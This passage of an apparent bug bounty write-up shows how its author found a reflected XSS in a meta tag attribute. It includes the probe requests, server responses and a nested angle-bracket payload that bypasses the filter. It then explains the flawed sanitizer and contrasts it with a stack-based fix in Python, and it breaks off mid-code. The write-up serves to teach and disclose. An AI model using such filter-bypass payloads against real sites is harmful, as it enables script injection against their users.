&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;Unfortunately I don’t have any screenshot of the exploitation of this XSS except the screenshot that shows the execution of the XSS, and the vulnerability is already patched. I don’t have the Burpsuite screenshot either because at that time I wasn’t even using Burpsuite, I was just starting in pentesting and playing with the web functionalities. Therefore the tool I used to test the XSS was the dev tools of the browser. I know, it’s crazy :laughing:&lt;/p&gt;

&lt;p&gt;Suppose that the URL returned by gau + kxss is as follows&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;where vuln-param is the vulnerable param to XSS.&lt;/p&gt;

&lt;p&gt;The parameter was reflected in several places but the problematic characters was reflected only in one of them: in the content attribute of a meta tag. So the response of the above request contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I was looking at Stack Overflow and I found that the XSS inside the content attribute of a meta tag is highly dependent of the used browser as you can see in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/18947139/xss-in-meta-tag&quot;&gt;Post in Stack Overflow talking about XSS in meta tag&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;so I tried to break the attribute assignment through a request of the form&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;bugbountytest2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and the response contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
bugbountytest2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far so good. Then I tried to inject some javascript code through a request of the form&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and the response contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so it looks like the backend is applying a sanitization.&lt;/p&gt;

&lt;p&gt;Is it a keyword sanitization based or it removes all the input strings between the &amp;lt; and &amp;gt; characters?&lt;/p&gt;

&lt;p&gt;To answer the above question I sent a request of the form&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;bugbountytest2&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and the response contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so the sanitization removes all the content between the &amp;lt; and &amp;gt; characters, both characters included, and not only the content that matches with some keywords. After that I wondered if nesting the &amp;lt; and &amp;gt; characters would give a different result so I sent several requests nesting the &amp;lt; and &amp;gt; characters but the most revealing of all was&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;bugbountytest2&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;whose response contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;bugbountytest2&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This result yields a very clear way of injecting javascript code in the response using the following request&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.example.com/?vuln-param=bugbountytest1&apos;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;script&amp;gt;alert(1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The response contained the following HTML code&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Resultados asociados a la palabra: &apos;bugbountytest1&apos;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and the reflected XSS was reproduced as you can see in the following screenshot&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-20-bug-bounty-1/xss-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work?&lt;/h2&gt;

&lt;p&gt;After exploiting the reflected XSS, I wondered what kind of sanitization algorithm could lead to the above behavior. I am not a professional programmer but I have some scripting knowledge so I know that there could be different algorithms to try to achieve the above sanitization, some of them unsafe.&lt;/p&gt;

&lt;p&gt;An insecure algorithm to try to achieve the above sanitization is to use a boolean variable to keep track of whether a &amp;lt; character has been encountered or not. This variable will be set to true when a &amp;lt; character has been encountered and false when no &amp;lt; character has been encountered or when a &amp;gt; character has been encountered that closes a &amp;lt; character. When the variable changes from true to false the algorithm removes all the content between the &amp;lt; and &amp;gt; characters, including both.&lt;/p&gt;

&lt;p&gt;The flaw of this algorithm is that it does not take into account that &amp;lt; and &amp;gt; characters can be nested, so the boolean variable will be true whether 1 or 10000 &amp;lt; characters are encountered and a single &amp;gt; will be enough to set the variable to false, even if there are other &amp;lt; characters without closing. This is what I call a boolean variable based sanitization algorithm.&lt;/p&gt;

&lt;p&gt;One way to avoid this flaw is to use a data structure, such as stack, to keep track of all unclosed &amp;lt; characters. This is what I call a stack based sanitization algorithm.&lt;/p&gt;

&lt;p&gt;The backend was designed in PHP but I have implemented both algorithms in python to show in practice what I mean by both algorithms&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Return the result of removing from input the substring between the characters in positions i and j
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remove_substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Get the boolean variable based sanitization of the input
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_boolean_variable_based_sanitization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Index of the input string
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Index of the last &amp;lt; found
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;less_than_char_found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Variable that controls if &amp;lt; was found before
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# If the current character is &amp;gt; and &amp;lt; was found before
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;less_than_char_found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remove_substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# If the current character is &amp;lt;
&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;less_than_char_found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Get the stack based sanitization of the input
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_stack_based_sanitization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;queue&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LifoQueue&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Index of the input string
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;less_than_char_stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LifoQueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Stack that keeps track of all &amp;lt; encountered
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# If the current character is &amp;gt; and &amp;lt; was found before
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remove_substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;less_than_char_index&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# If the current character is &amp;lt;
&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;less_than_char_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Main code to test both algorithms
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# List of inputs
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;input_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&apos;&quot;&amp;gt;bugbountytest2&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&apos;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&apos;&quot;&amp;gt;&amp;lt;bugbountytest2&amp;gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&apos;&quot;&amp;gt;&amp;lt;&amp;lt;&amp;gt;bugbountytest2&amp;gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;bugbountytest1&apos;&quot;&amp;gt;&amp;lt;&amp;lt;&amp;gt;script&amp;gt;alert(1)&amp;lt;&amp;lt;&amp;gt;/script&amp;gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Execute the sanitizations for all the inputs
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Apply the sanitizations
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;boolean_variable_based_sanitization&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_boolean_variable_based_sanitization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;stack_based_sanitization&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_stack_based_sanitization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Store the output of the sanitizations
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Input  -&amp;gt;  &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
